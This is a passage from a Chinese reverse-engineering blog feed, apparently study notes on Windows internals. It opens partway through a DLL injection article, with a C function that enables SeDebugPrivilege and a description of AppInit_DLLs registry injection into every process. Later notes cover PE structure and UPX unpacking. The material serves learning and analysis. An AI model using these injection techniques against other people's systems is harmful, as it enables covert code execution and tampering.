href="#附">¶</a>附</h3><p><a href="https://blog.csdn.net/xiewneqi/article/details/4683888?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ETopBlog-1.topblog&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ETopBlog-1.topblog&amp;utm_relevant_index=1">https://blog.csdn.net/xiewneqi/article/details/4683888?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~TopBlog-1.topblog&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~TopBlog-1.topblog&amp;utm_relevant_index=1</a></p><p>有时候需要提升进程权限</p><blockquote><p>在枚举/结束系统进程/或操作系统服务时，会出现自己权限不足而失败的情况，这时就需要提升自己进程到系统权限</p></blockquote><h4 id="前置知识-v2"><a class="header-anchor" href="#前置知识-v2">¶</a>前置知识</h4><blockquote><p><strong>Windows的每个用户登录时，系统会产生一个访问令牌(access token)，其中关联了当前用户的权限信息，用户登录后创建的每一个进程都含有用户access token的拷贝。当进程试图执行某些需要特殊权限的操作或者是访问受保护的内核对象时，系统会检查其access token中的权限信息以决定是否授权操作。</strong></p></blockquote><p>Administrator组成员的access token中会含有一些可以执行系统级操作的特权(privileges)，如终止任意进程、关闭\重启系统、加载设备驱动和更改系统时间等，不过这些权限默认是被禁用的</p><p>当Administrator组成员创建的进程中包含一些需要特权的操作时，进程必须首先打开这些禁用的特权以提升自己的权限，否则系统将拒绝进程的操作。</p><blockquote><p><strong>windows以字符串的形式表示系统特权，如”SeCreatePageFilePrivilege“表示该特权用于创建页面文件，”SeDebugPrivilege“表示该特权可用于调试及更改其他进程的内存，为了方便使用这些字符串，微软在winnt.h定义了一组宏，如#define SE_DEBUG_NAME TEXT(“SeDebugPrivilege”)</strong></p></blockquote><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649725957948.png" alt="权限列表"></p><p>在vs的定义也可以看到，这些宏定义对应了不同的权限，可以使用LookupPrivilege函数得到对应权限的LUID</p><blockquote><p><strong>虽然Windows使用字符串表示特权，但查询或更改特权的API需要LUID来引用相应的特权，LUID表示 local unique identifier ，在系统中是唯一的。为了提升进程权限到指定的特权，我们必须找到特权对应的LUID，这时候就需要调用LookupPrivilege函数，获取到特权对应的LUID时，我们要打开该特权，此时要用到LUID_AND_ATTRIBUTES结构</strong></p></blockquote><p>其定义如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LUID_AND_ATTRIBUTES</span> {</span></span><br><span class="line">    LUID Luid;</span><br><span class="line">    DWORD Attributes;</span><br><span class="line">} LUID_AND_ATTRIBUTES, * PLUID_AND_ATTRIBUTES;</span><br></pre></td></tr></tbody></table></figure><p>当Attributes的值取SE_PRIVILEGE_ENABLED时将打开LUID对应的特权。设置完成后</p><blockquote><p><strong>AdjustTokenPrivileges函数通知操作系统将指定的access token权限中的特权置为打开状态，前面我们说过，进程执行需要特列权限的操作时，系统将检查其access token，因此更改了进程的access token特权设置，也就是更改了所属进程的特权设置</strong></p></blockquote><p>函数定义如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">AdjustTokenPrivileges</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  __in          HANDLE TokenHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  __in          BOOL DisableAllPrivileges,</span></span></span><br><span class="line"><span class="params"><span class="function">  __in_opt      PTOKEN_PRIVILEGES NewState,</span></span></span><br><span class="line"><span class="params"><span class="function">  __in          DWORD BufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  __out_opt     PTOKEN_PRIVILEGES PreviousState,</span></span></span><br><span class="line"><span class="params"><span class="function">  __out_opt     PDWORD ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>TokenHandle是要更改特权设置的access token的句柄，DisableAllPrivileges表示是否禁用该access token的所有特权，NewState用来传递新的特权设置，注意它的类型是PTOKEN_PRIVILEGES，它是TOKEN_PRIVILEGES结构的指针</p><p>TOKEN_PRIVILEGES定义如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN_PRIVILEGES</span> {</span></span><br><span class="line">    DWORD PrivilegeCount;</span><br><span class="line">    LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];</span><br><span class="line">} TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;</span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong>其中ANYSIZE_ARRAY被定义为1，可以看到TOKEN_PRIVILEGES中包含了用于设置特权信息的LUID_AND_ATTRIBUTES结构，在使用时，只需要将PrivilegeCount赋为1，然后把Privileges数组的第1个元素（Privileges[0]）的Luid域设置为指定特权的Luid，再将其Attributes域设置为SE_PRIVILEGE_ENABLED，就可以完成TokenHandle表示的access token权限的提升了</strong></p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">HANDLE hToken;</span><br><span class="line">LUID luid;</span><br><span class="line"><span class="comment">//获取当前进程的access token句柄</span></span><br><span class="line"><span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">&amp;hToken))</span><br><span class="line">{</span><br><span class="line">_tprintf(<span class="string">L"OpenProcessToken error: %u\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//查找newprivileges参数对应的Luid，并将结果写入tp.Privileges[0]的Luid域中</span></span><br><span class="line"><span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">&amp;luid))        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">{</span><br><span class="line">_tprintf(<span class="string">L"LookupPrivilegeValue error: %u\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//设置tp的结构</span></span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line"><span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//通知操作系统更改权限</span></span><br><span class="line"><span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line"><span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">FALSE,</span><br><span class="line">&amp;tp,</span><br><span class="line"><span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">(PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">(PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">{</span><br><span class="line">_tprintf(<span class="string">L"AdjustTokenPrivileges error: %u\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line">{</span><br><span class="line">_tprintf(<span class="string">L"The token does not have the specified privilege. \n"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="0x01-注册表注入"><a class="header-anchor" href="#0x01-注册表注入">¶</a>0x01-注册表注入</h1><h2 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h2><p>Windows操作系统的注册表默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658626858.png" alt=""></p><p>在注册表编辑器中，将要注入的DLL路径字符串写入AppInit_DLLs项目，然后把LoadAppInit_DLLs的项目值设置为1.重启后，指定DLL会注入所有进程。</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658441593.png" alt=""></p><h1 id="0x02-SetWindowsHookEx"><a class="header-anchor" href="#0x02-SetWindowsHookEx">¶</a>0x02-SetWindowsHookEx()</h1><p>在另一篇文章Hook写了，就不过多介绍</p><p>下面是更详细的解释</p><p><a href="https://cloud.tencent.com/developer/article/1199648?msclkid=f79c9cc7b96011ecbdb2f47296f3b9d3">https://cloud.tencent.com/developer/article/1199648?msclkid=f79c9cc7b96011ecbdb2f47296f3b9d3</a></p><p>注入DLL的第三个方法就是消息钩取</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658514411.png" alt=""></p><h1 id="0x03-还有其他方法"><a class="header-anchor" href="#0x03-还有其他方法">¶</a>0x03-还有其他方法</h1><p><a href="https://bbs.pediy.com/thread-253918.htm">https://bbs.pediy.com/thread-253918.htm</a></p>]]></content>
    
    
    <summary type="html">《逆向工程核心原理》DLL注入</summary>
    
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Windows内核基础</title>
    <link href="https://gift1a.github.io/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/"/>
    <id>https://gift1a.github.io/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/</id>
    <published>2022-04-09T11:04:09.000Z</published>
    <updated>2022-04-20T05:34:07.831Z</updated>
    
    <content type="html"><![CDATA[<p>Windows基础</p><span id="more"></span> <h1 id="0x00-权限级别"><a class="header-anchor" href="#0x00-权限级别">¶</a>0x00-权限级别</h1><p>先来看一下特权级环，从里往外权限逐渐降低</p><p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650108857255.png" alt="特权级环"></p><blockquote><p><strong>系统内核层，又叫零环（Ring 0，简称“R0”；与此对应的应用层叫3环，即Ring 3，简称“R3”），实际上是CPU的4个运行级别中的一个</strong></p></blockquote><p>CPU设计者将CPU的运行级别从内往外分为4个，依次为R0、R1、R2、R3，运行权限从R0到R3依次降低。CPU设计制造商在设计之初是让R0运行内核，让R1、R2运行驱动设备，让R3运行应用程序的。</p><p>操作系统设计者与开发商在设计操作系统（例如微软Windows和开源社区的Linus编写的Linux）的时候，为了让工作变得简单，<strong>并没有使用R1和R2两个级别，而是将设备驱动运行在与内核一个级别的R0级</strong></p><p>在AMD64CPU诞生之后，CPU的设计者干脆也和操作吸引保持一致，只保留了R0和R3两个级别</p><p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650109580425.png" alt="Windows XP体系结构简图"></p><p>HAL是一个可加载的核心模块HAL.DLL，它为运行在Windows XP上的硬件平台提供低级接口。Windows XP的执行体是NTOSKRNL.EXE的上层（内核是其下层）。用户层导出并且可以调用的函数接口在NTDLL.DLL中，通过Win32 API或其他环境子系统对它们进行访问</p><p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650109820013.png" alt=""></p><h1 id="0x01-内存空间布局"><a class="header-anchor" href="#0x01-内存空间布局">¶</a>0x01-内存空间布局</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows基础&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>逆向工程核心原理</title>
    <link href="https://gift1a.github.io/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    <id>https://gift1a.github.io/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/</id>
    <published>2022-04-07T09:19:45.000Z</published>
    <updated>2022-04-20T05:41:22.460Z</updated>
    
    <content type="html"><![CDATA[<p>《逆向工程核心原理》</p><span id="more"></span> <h1 id="0x00-调试Helloworld程序"><a class="header-anchor" href="#0x00-调试Helloworld程序">¶</a>0x00-调试Helloworld程序</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649326083343.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649326142470.png" alt=""></p><p>选择Release模式生成的可执行文件能使程序代码更简洁，方便调试-之前我都是debug模式的，难怪有一堆初始化操作</p><blockquote><p>OD指令-Ctrl+F2，重新开始调试</p><p>​Ctrl+F9，一直在函数代码内部运行，知道遇到retn，跳出函数</p><p>​:可以给地址添加标签</p><p>​                Ctrl+E，编辑数据</p><p>​空格，编写汇编代码</p></blockquote><h1 id="0x01-小端序标记法"><a class="header-anchor" href="#0x01-小端序标记法">¶</a>0x01-小端序标记法</h1><p>采用小端序时，地址高位存储数据的高位，地址低位存储数据的低位，我们知道一个地址最多存储一个字节的单元，也就是两个十六进制，那么0x12345678在内存存储中时则为78 56 34 12</p><h1 id="0x02-IA-32寄存器基本讲解"><a class="header-anchor" href="#0x02-IA-32寄存器基本讲解">¶</a>0x02-IA-32寄存器基本讲解</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649328781711.png" alt="通用寄存器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649328919424.png" alt="寄存器作用"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649328950871.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333035627.png" alt="段寄存器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333102096.png" alt=""></p><p>其中FS寄存器比较重要，用于计算SEH、TEB、PEB等地址</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333204894.png" alt="重要标志位"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333235729.png" alt=""></p><h1 id="0x03-栈"><a class="header-anchor" href="#0x03-栈">¶</a>0x03-栈</h1><p>栈的特征</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333398152.png" alt="栈的特征"></p><p>函数调用入栈顺序</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333596093.png" alt=""></p><h1 id="0x04-栈帧"><a class="header-anchor" href="#0x04-栈帧">¶</a>0x04-栈帧</h1><p>通过EBP-栈帧指针寄存器访问局部变量、参数、函数返回地址</p><p>函数开始时要先把已有值保存到栈中</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333832316.png" alt=""></p><p>指出相关内存属于哪个段</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334137175.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334312797.png" alt="返回值"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334395974.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334452555.png" alt="外平栈和内平栈"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334531491.png" alt="xor eax,eax"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334591186.png" alt="关闭段显示"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334796214.png" alt="函数的间接调用"></p><p>Test相当于&amp;命令，改变ZF的值</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334897963.png" alt="TEST指令"></p><h1 id="0x05-Process-Explorer"><a class="header-anchor" href="#0x05-Process-Explorer">¶</a>0x05-Process Explorer</h1><p>安装Peocess Explorer、sysinternals</p><h1 id="0x06-函数调用约定"><a class="header-anchor" href="#0x06-函数调用约定">¶</a>0x06-函数调用约定</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336046853.png" alt="cdecl"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336074342.png" alt="stdcall"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336102197.png" alt="stdcall"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336128921.png" alt="fastcall"></p><h1 id="0x07-鸡汤"><a class="header-anchor" href="#0x07-鸡汤">¶</a>0x07-鸡汤</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336265323.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336281377.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336312616.png" alt=""></p><h1 id="0x08-PE文件格式"><a class="header-anchor" href="#0x08-PE文件格式">¶</a>0x08-PE文件格式</h1><p>相当于复习了</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649337195834.png" alt="RVA与VA"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649342412672.png" alt="映像"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649342725432.png" alt="显式链接与隐式链接"></p><h2 id="为什么要有导入表"><a class="header-anchor" href="#为什么要有导入表">¶</a>为什么要有导入表</h2><p>1、是因为不同版本的dll函数存放的地址也不同，为了能正常调用函数，编译器准备了存放函数实际地址的位置</p><p>2、重定位，多个dll无法同时装载到1000000h</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649343048380.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649377368994.png" alt="导入表"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649377721063.png" alt="导入表结构"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649377867593.png" alt="IAT输入顺序"></p><p>因为存在按序号导入也有按名称导入，所以获取函数起始地址的时候有两种方式</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649378338899.png" alt="程序运行中的IAT表"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649379766533.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649379898617.png" alt="导出表"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380029780.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380146114.png" alt="获取函数地址"></p><p>即通过函数名称导出：先去函数名称表依次比较，找到相同时，得到索引index，去导出序号表根据index取出里面的值作为新的索引index_new，再去函数地址表找到函数地址</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380438215.png" alt="按序号导出"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380791104.png" alt="patched PE"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649381026465.png" alt=""></p><h1 id="0x09-运行时压缩"><a class="header-anchor" href="#0x09-运行时压缩">¶</a>0x09-运行时压缩</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649381576476.png" alt="压缩器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649381637551.png" alt="保护器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382063431.png" alt="保护器种类"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382125254.png" alt="upx加壳后的notepad.exe"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382165657.png" alt=""></p><h1 id="0x0A-调试UPX压缩的notepad程序"><a class="header-anchor" href="#0x0A-调试UPX压缩的notepad程序">¶</a>0x0A-调试UPX压缩的notepad程序</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382397337.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382481059.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382514246.png" alt="OD跟踪命令"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382717431.png" alt="解码循环"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382768527.png" alt="恢复地址"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382833291.png" alt="IAT"></p><h1 id="0x0B-基址重定位表"><a class="header-anchor" href="#0x0B-基址重定位表">¶</a>0x0B-基址重定位表</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391242570.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391309699.png" alt="ASLR"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391324972.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391676854.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470225805.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470309143.png" alt="重定位表中的地址计算"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470391830.png" alt="重定位表分块大小原因"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470561427.png" alt="重定位"></p><h1 id="0x0C-从可执行文件中删除重定位表"><a class="header-anchor" href="#0x0C-从可执行文件中删除重定位表">¶</a>0x0C-从可执行文件中删除重定位表</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470715916.png" alt=""></p><p><img 